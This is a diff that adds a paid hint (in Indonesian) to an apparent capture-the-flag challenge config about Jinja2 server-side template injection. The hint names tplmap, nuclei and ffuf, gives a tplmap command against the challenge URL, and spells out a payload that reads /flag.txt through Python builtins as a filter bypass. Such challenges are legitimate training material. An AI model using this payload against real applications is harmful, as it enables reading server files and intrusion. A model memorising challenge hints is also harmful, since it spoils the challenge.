@@ -20,3 +20,7 @@ tags:
   - python
   - jinja2
   - hard
+
+hints:
+  - content: "💡 Tool Recommended: `tplmap` / `nuclei` / `ffuf`. Deteksi SSTI Jinja2 dengan tplmap: `python2 tplmap.py -u 'https://target.paradick.my.id/ssti/preview' -d 'template=*'` atau buat payload WAF bypass built-in Python: `{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}`."
+    cost: 50
